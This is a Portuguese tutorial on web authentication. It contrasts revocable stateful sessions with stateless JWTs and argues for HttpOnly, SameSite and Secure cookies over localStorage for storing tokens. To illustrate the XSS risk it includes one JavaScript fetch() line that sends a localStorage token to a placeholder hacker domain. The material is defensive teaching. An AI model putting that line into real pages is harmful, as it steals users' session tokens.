# Aprendizado: Sessões Stateful vs. JWT e Proteção de Cookies

## O Grande Dilema: JWT Stateless vs. Sessão com Cookie

Muitos tutoriais recomendam JWT (JSON Web Token) sem explicar os riscos e armadilhas em aplicações do mundo real. Vamos entender as diferenças:

### O que é JWT Stateless?
Um JWT é um pedaço de JSON assinado digitalmente pelo servidor com uma chave secreta. O cliente guarda esse token e o envia a cada requisição. O servidor não consulta nenhum banco para saber se o token é válido: ele apenas verifica a assinatura matemática.

- **Vantagem teórica:** O servidor não precisa consultar banco de dados para autenticar a requisição.
- **A grande armadilha:** **Como revogar um JWT antes do prazo de validade?**
  - Se um usuário for banido por fraude, o JWT dele continua válido até expirar.
  - Se a senha for alterada, sessões abertas em outros aparelhos continuam ativas.
  - Se você precisar criar uma lista de revogação no Redis para checar cada JWT... parabéns, você acabou de recriar uma sessão stateful, só que com mais complexidade!

### O que é a Sessão Stateful (Nossa Escolha)?
1. Quando o usuário faz login, o servidor cria um identificador aleatório seguro de 32 bytes (o token de sessão).
2. O servidor salva o hash desse token no banco de dados na tabela `sessions` associado ao `user_id`.
3. O servidor entrega o token ao navegador em um cookie.
4. A cada requisição, o servidor busca o token na tabela `sessions`. Como a tabela possui índice na coluna do token, a busca leva frações de milissegundo.
5. Se o usuário clicar em "Logout" ou a conta for bloqueada, basta deletar a linha do banco. **A sessão morre no mesmo milissegundo em todos os lugares.**

---

## Onde Salvar o Token? Por que NUNCA no LocalStorage?

Muitas aplicações salvam tokens no `localStorage` do navegador via JavaScript (`localStorage.setItem('token', ...)`).
- **O perigo:** Qualquer script JavaScript rodando na sua página tem acesso total ao `localStorage`. Se uma biblioteca de terceiros (via `npm`) sofrer um ataque de injeção de script (XSS - Cross-Site Scripting), o invasor consegue roubar o token com uma linha de código:
  ```javascript
  fetch('https://site-do-hacker.com/steal?token=' + localStorage.getItem('token'));
  ```

### A Solução: Cookies com `HttpOnly`
Quando enviamos o token em um cookie com a flag `HttpOnly`, o navegador **proíbe o JavaScript da página de ler o cookie**.
- Se houver uma vulnerabilidade de XSS na tela, o atacante **não consegue extrair o token**. O navegador anexa o cookie automaticamente nas requisições HTTP feitas para a nossa própria origem.

### As Três Diretivas de Ouro de um Cookie Seguro:
1. `HttpOnly = true`: Impede que scripts maliciosos leiam a sessão via `document.cookie`.
2. `SameSite = 'Lax'`: Impede que sites externos maliciosos façam requisições forjadas em nome do usuário logado (proteção contra CSRF).
3. `Secure = true`: Garante que o cookie só trafegue por conexões criptografadas (HTTPS), evitando interceptação em redes Wi-Fi públicas.

